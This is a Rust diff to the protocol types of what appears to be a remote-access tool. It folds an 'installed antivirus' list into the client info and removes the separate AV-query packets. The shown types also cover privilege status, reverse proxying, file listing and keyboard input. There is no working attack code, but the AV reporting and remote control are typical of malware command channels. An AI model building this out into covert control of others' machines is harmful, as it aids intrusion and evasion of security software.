@@ -3,6 +3,8 @@ use serde::{Deserialize, Serialize};
 
 #[derive(Debug, PartialEq, Eq, Clone, Deserialize, Serialize)]
 pub struct ClientInfo {
+    pub uuidv4: Option<String>,
+    pub addr: Option<String>,
     pub group: String,
     pub username: String,
     pub hostname: String,
@@ -12,8 +14,10 @@ pub struct ClientInfo {
     pub gpus: Vec<String>,
     pub storage: Vec<String>,
     pub displays: i32,
+    pub disconnected: Option<bool>,
     pub is_elevated: bool,
     pub reverse_proxy_port: String,
+    pub installed_avs: Vec<String>,
 }
 
 pub trait Packet {
@@ -40,9 +44,7 @@ pub enum ServerboundPacket {
 
     DisksResult(Vec<String>),
     FileList(Vec<File>),
-    CurrentFolder(String),
-    
-    InstalledAVs(AVList),
+    CurrentFolder(String),    
 }
 
 impl Packet for ServerboundPacket {
@@ -70,7 +72,6 @@ impl Packet for ServerboundPacket {
             ServerboundPacket::DisksResult(_) => "DisksResult",
             ServerboundPacket::FileList(_) => "FileList",
             ServerboundPacket::CurrentFolder(_) => "CurrentFolder",
-            ServerboundPacket::InstalledAVs(_) => "InstalledAVs",
         }
     }
 }
@@ -111,8 +112,6 @@ pub enum ClientboundPacket {
 
     StartReverseProxy(String),
     StopReverseProxy,
-    
-    GetInstalledAVs,
 }
 
 impl Packet for ClientboundPacket {
@@ -159,7 +158,6 @@ impl Packet for ClientboundPacket {
 
             ClientboundPacket::StartReverseProxy(_) => "Start Reverse Proxy",
             ClientboundPacket::StopReverseProxy => "Stop Reverse Proxy",
-            ClientboundPacket::GetInstalledAVs => "Get Installed AVs",
         }
     }
 }
@@ -233,9 +231,4 @@ pub struct KeyboardInputData {
     pub shift_pressed: bool, // Shift modifier state
     pub ctrl_pressed: bool,  // Ctrl modifier state
     pub caps_lock: bool,     // Caps lock state
-}
-
-#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
-pub struct AVList {
-    pub avs: Vec<String>,
 }
